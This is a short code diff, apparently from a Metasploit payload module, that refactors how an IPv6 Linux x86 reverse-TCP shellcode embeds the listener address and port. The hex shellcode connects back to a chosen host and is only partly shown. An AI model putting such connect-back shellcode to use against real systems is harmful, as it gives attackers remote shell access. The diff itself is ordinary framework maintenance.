@@ -30,17 +30,14 @@ module MetasploitModule
 
   def generate
       target_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../) # convert LHOST to expanded IPv6 address in hex format
-      first_dword  = target_ipv6[0]
-      second_dword = target_ipv6[1]
-      third_dword  = target_ipv6[2]
-      fourth_dword = target_ipv6[3]
+
       "\x31\xdb\xf7\xe3\x6a\x06\x6a\x01\x6a\x0a\x89\xe1\xb0\x66\xb3\x01" +
       "\xcd\x80\x89\xc6\x31\xc0\xb0\x02\x31\xdb\xcd\x80\x39\xd8\x74\x02" +
       "\x77\x70\x31\xc9\x31\xdb\x53\x53" +
-      "\x68" + fourth_dword + # push the four dward on the stack in reverse order
-      "\x68" + third_dword  +
-      "\x68" + second_dword +
-      "\x68" + first_dword  +
+      "\x68" + target_ipv6[3]  + # push each address dword on the stack in reverse order
+      "\x68" + target_ipv6[2]  +
+      "\x68" + target_ipv6[1]  +
+      "\x68" + target_ipv6[0]  +
       "\x53\x66\x68" + [datastore['LPORT'].to_i].pack('S>') + # push the TCP port on the stack 
       "\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x31\xdb\x31\xc0\xb0\x66\xb3" +
       "\x03\x89\xe1\xcd\x80\x31\xdb\x39\xd8\x75\x36\x31\xc9\xf7\xe1\x89" +
